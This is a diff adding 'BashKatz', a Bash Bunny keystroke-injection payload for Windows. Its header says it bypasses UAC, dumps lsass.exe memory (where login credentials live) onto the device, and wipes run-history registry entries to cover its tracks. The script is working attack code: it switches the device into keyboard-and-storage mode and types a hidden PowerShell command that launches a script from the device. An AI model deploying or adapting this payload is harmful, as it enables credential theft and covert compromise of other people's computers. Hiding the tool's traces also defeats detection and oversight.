@@ -1,0 +1,39 @@
+#!/bin/bash
+#
+# Title:         BashKatz
+# Author:        Rob Emmerson (robemmerson)
+# Version:       1.0
+# Target:        Windows
+# 
+# Runs powershell as Administrator
+# Bypasses UAC completely!
+# Dumps lsass.exe memory to the Bash Bunny
+# Tides up the last run registry entries
+#
+
+LED G R 500
+
+# Create directory to dump infos
+mkdir -p /root/udisk/loot/BashKatz
+
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION then shorten it for the command line as I found it unstable with long text strings
+source bunny_helpers.sh
+export S=$SWITCH_POSITION
+
+# Set language accordingly
+QUACK SET_LANGUAGE gb
+
+# Setup the attack mode
+ATTACKMODE HID STORAGE
+
+LED B 500
+
+# Launch powershell as admin
+QUACK GUI r
+QUACK DELAY 200
+QUACK STRING powershell -WindowStyle Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$S\exe.cmd')"
+QUACK ENTER
+
+# Delay by 6 seconds to give it time to run and go green
+QUACK DELAY 6000
+LED G
